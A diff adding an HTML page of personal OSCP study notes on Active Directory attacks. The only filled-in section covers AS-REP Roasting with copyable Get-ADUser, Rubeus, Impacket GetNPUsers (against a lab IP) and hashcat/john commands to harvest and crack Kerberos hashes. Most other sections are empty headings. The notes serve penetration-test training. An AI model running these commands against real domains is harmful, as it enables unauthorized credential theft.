@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>AD Attacks | OSCP Notes</title>
+
+  <meta name="color-scheme" content="dark">
+  <style>
+    html, body {
+      margin: 0;
+      background: #0b0c0d;
+      color: #e8e8ea;
+    }
+  </style>
+
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+
+<body>
+<div class="layout">
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+
+  <div class="profile">
+    <img src="../img/logo.png" alt="Logo" class="profile-img">
+    <h2>Genaro</h2>
+    <p class="tag">XXXX XXXX</p>
+  </div>
+
+  <div class="socials">
+    <a href="https://youtube.com/@g3narin" target="_blank">
+      <span class="icon">▶</span>
+      <span>YouTube</span>
+      <span class="user">g3narin</span>
+    </a>
+    <a href="https://app.hackthebox.com/users/2426983" target="_blank">
+      <span class="icon">⬢</span>
+      <span>HackTheBox</span>
+      <span class="user">Genaro</span>
+    </a>
+  </div>
+
+  <hr class="divider">
+
+  <nav class="nav">
+
+    <a href="../index.html">🏠 Home</a>
+
+    <a href="enumeration.html">🔍 Enumeration</a>
+    <a href="web-attacks.html">🌐 Web Attacks</a>
+
+    <a href="shells.html">🐚 Shells & Payloads</a>
+    <a href="file-transfer.html">📁 File Transfer</a>
+
+    <a href="passwords.html">🔑 Password Attacks</a>
+
+    <a href="linux-privesc.html">🐧 Linux PrivEsc</a>
+    <a href="windows-privesc.html">🪟 Windows PrivEsc</a>
+
+    <a href="pivoting.html">🔀 Pivoting</a>
+
+    <a href="ad-enumeration.html">🧩 AD Enumeration</a>
+  <a href="ad-attacks.html">⚔️ AD Attacks I</a>
+    <a href="ad-attacks2.html">⚔️ AD Attacks II</a>
+
+  <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
+
+  </nav>
+
+</aside>
+
+<!-- MAIN -->
+<main class="main">
+
+  <div class="topbar">
+    <div class="topbar-inner">
+      <input id="searchInput" placeholder="Search...">
+      <button id="clearBtn">Clear</button>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- TITLE -->
+    <div class="section">
+      <h1>Active Directory Attacks I</h1>
+
+    </div>
+<div class="section">
+  <h2>AS-REP Roasting</h2>
+
+  <p>
+    AS-REP Roasting abuses Kerberos accounts that do not require pre-authentication.
+    An attacker can request authentication data and receive a response encrypted
+    with the user’s password hash, which can be cracked offline.
+  </p>
+
+  <p>
+    This attack does not require valid credentials. It only depends on the target
+    account having Kerberos pre-authentication disabled.
+  </p>
+
+  <h3>How AS-REP Roasting Works</h3>
+  <p>
+    The attacker requests an AS-REP message for a vulnerable user. The response
+    contains encrypted data derived from the user’s password, allowing offline
+    brute-force attacks without interacting further with the domain.
+  </p>
+
+  <h3>Find Users Without Pre-Authentication</h3>
+  <p>
+    Enumerates domain users configured without Kerberos pre-authentication, making
+    them vulnerable to AS-REP Roasting.
+  </p>
+
+  <pre><code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth</code>
+  <button class="copy-btn" data-copy='Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth'>COPY</button>
+  </pre>
+
+  <h3>AS-REP Roasting with Rubeus</h3>
+  <p>
+    Requests AS-REP responses for vulnerable users directly from the domain controller
+    and outputs crackable hashes.
+  </p>
+
+  <pre><code>Rubeus.exe asreproast</code>
+  <button class="copy-btn" data-copy="Rubeus.exe asreproast">COPY</button>
+  </pre>
+
+  <pre><code>Rubeus.exe asreproast /nowrap</code>
+  <button class="copy-btn" data-copy="Rubeus.exe asreproast /nowrap">COPY</button>
+  </pre>
+
+  <h3>AS-REP Roasting with Impacket</h3>
+  <p>
+    Extracts AS-REP hashes remotely using Impacket, commonly from a Kali Linux system.
+  </p>
+
+  <pre><code>impacket-GetNPUsers -dc-ip $dc-ip -request -outputfile hashes.txt domain.com/user</code>
+  <button class="copy-btn" data-copy="impacket-GetNPUsers -dc-ip $dc-ip -request -outputfile hashes.txt domain.com/user">COPY</button>
+  </pre>
+
+  <pre><code>GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175</code>
+  <button class="copy-btn" data-copy="GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175">COPY</button>
+  </pre>
+
+  <h3>Crack AS-REP Hashes</h3>
+  <p>
+    Performs offline password cracking against extracted AS-REP hashes using common
+    wordlists.
+  </p>
+
+  <pre><code>hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt</code>
+  <button class="copy-btn" data-copy="hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt">COPY</button>
+  </pre>
+
+  <pre><code>john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code>
+<button class="copy-btn" data-copy="john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt">COPY</button>
+</pre>
+</div>
+
+
+    <div class="section">
+      <h2>Kerberoasting</h2>
+    </div>
+    <div class="section">Common error: ....
+
+
+      sudo timedatectl set-ntp false; sudo ntpdate -u $DC_IP
+
+
+    </div>
+
+    <div class="section">
+      <h2>Silver Ticket Attacks</h2>
+    </div>
+
+    <div class="section">
+      <h2>Golden Ticket Attacks</h2>
+    </div>
+
+    <div class="section">
+      <h2>Domain Controller Synchronization</h2>
+    </div>
+
+    <div class="section">
+      <h2>Cached Domain Credentials</h2>
+    </div>
+
+    <div class="section">
+      <h2>NTLM Authentication Attacks</h2>
+    </div>
+
+    <div class="section">
+      <h2>Kerberos Authentication Attacks</h2>
+    </div>
+
+    <div class="section">
+      <h2>Password-Based Attacks</h2>
+    </div>
+
+    <div class="section">
+      <h2>Volume Shadow Copy Abuse</h2>
+    </div>
+
+    <div class="section">
+      <h2>Constrained Delegation Attacks</h2>
+    </div>
+
+    <div class="section">
+      <h2>Enumeration, Spraying, and Post-Enumeration</h2>
+    </div>
+
+    <div class="section">
+      <h2>Pass-the-Ticket</h2>
+    </div>
+
+    <div class="section">
+      <h2>AD Attack Strategy</h2>
+      <ul>
+        <li>Roast before brute-force</li>
+        <li>Tickets are more powerful than passwords</li>
+        <li>ACL abuse beats exploits</li>
+        <li>Domain Admin is a relationship, not a vuln</li>
+      </ul>
+    </div>
+
+  </div>
+</main>
+
+</div>
+
+<script src="../js/main.js"></script>
+</body>
+</html>
